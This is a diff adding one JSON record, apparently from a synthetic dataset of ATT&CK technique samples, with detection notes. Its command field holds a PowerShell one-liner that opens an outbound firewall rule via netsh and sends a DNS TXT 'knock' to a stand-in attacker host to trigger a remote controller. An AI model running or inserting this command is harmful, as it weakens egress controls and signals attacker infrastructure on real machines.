@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "& netsh advfirewall firewall add rule name='DNS-Signal-UDP53' dir=out action=allow protocol=UDP remoteport=53 remoteip=203.0.113.10 >$null;nslookup -type=TXT _knock.signal.attacker.tld 203.0.113.10 >$null",
+  "explanation": "Signals to a remote controller using a DNS TXT query (to 203.0.113.10), which can be used by the adversary as a magic packet trigger. A firewall rule via netsh ensures outbound DNS to that resolver is allowed. No obfuscation is used.",
+  "rationale_steps": [
+    "Permit outbound UDP/53 to a specific resolver using netsh to avoid egress controls.",
+    "Send a DNS TXT request with a known magic label that the remote monitors as a trigger.",
+    "Detection: monitor non-standard resolvers per host, outbound DNS to unusual IPs, and process lineage showing nslookup invoked by PowerShell."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-3c835ea5-f1ab4096",
+  "source_prompt_hash": "3c835ea5",
+  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
